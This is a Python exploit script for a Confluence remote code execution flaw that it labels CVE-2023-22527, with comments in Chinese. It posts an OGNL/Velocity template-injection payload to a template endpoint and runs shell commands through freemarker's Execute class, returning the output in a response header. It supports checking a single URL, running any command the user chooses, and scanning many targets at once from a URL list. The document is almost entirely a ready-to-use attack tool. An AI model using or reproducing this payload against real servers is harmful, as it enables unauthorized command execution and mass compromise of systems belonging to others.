import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import string
from urllib.parse import urljoin
import warnings  
from requests.packages.urllib3.exceptions import InsecureRequestWarning

#忽略HTTPS请求中抛出的异常，如需调试代码请删除此行代码。
warnings.filterwarnings("ignore", category=InsecureRequestWarning)
 
def check_vuln(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding':'gzip, deflate, br',
            'Accept':'*/*',
            'Accept-Language':'en-US;q=0.9,en;q=0.8',
            'Connection':'close',
            'Cache-Control': 'max-age=0',
            'Content-Length':'285'
        }
        
        target = urljoin(url, '/template/aui/text-inline.vm')
        payload = r'''label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))'''
        response = requests.post(target, headers=headers, data=payload, verify=False, timeout=5)
        #print(response.headers)
        if response.status_code == 200 and 'X-Cmd-Response' in response.headers:
            print(f"存在漏洞:{url}")
        else:
            print("不存在！")
    except Exception as e:
        pass
        
        
def exploit_vuln(url,cmd):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding':'gzip, deflate, br',
            'Accept':'*/*',
            'Accept-Language':'en-US;q=0.9,en;q=0.8',
            'Connection':'close',
            'Cache-Control': 'max-age=0',
            'Content-Length':'285'
        }
        
        target = urljoin(url, '/template/aui/text-inline.vm')
        payload = r'''label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"'''+cmd+'''"}))'''
        response = requests.post(target, headers=headers, data=payload, verify=False)
        #print(response.headers)
        if response.status_code == 200 and 'X-Cmd-Response' in response.headers:
            print(response.headers['X-Cmd-Response'])
        else:
            print("利用失败！")
    except Exception as e:
        pass

def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        works.append(i)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_vuln, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def init_config():
    global args
    arg = ArgumentParser(description='Atlassian Confluence 远程代码执行漏洞 CVE-2023-22527')
    arg.add_argument("-u",
					 "--url",
					 help="Target URL; Example: python .py -u http://ip:port")
    arg.add_argument("-f",
					 "--file",
					 help="Target urllist; Example: python .py -f urllist")
    arg.add_argument("-c",
					 "--cmd",
					 help="Target command; Example: python .py -u http://ip:port -c whoami")
    args = arg.parse_args()



if __name__ == '__main__':
    init_config()
    url = args.url
    filename = args.file
    cmd = args.cmd
    url_list = []
    if url != None and filename == None and cmd == None:
        check_vuln(url)
    elif url !=None and cmd !=None and filename == None:
        exploit_vuln(url,cmd)
    elif url == None and cmd == None and filename != None:
        for i in open(filename):
            i = i.replace('\n','')
            url_list.append(i)
        multithreading(url_list,10)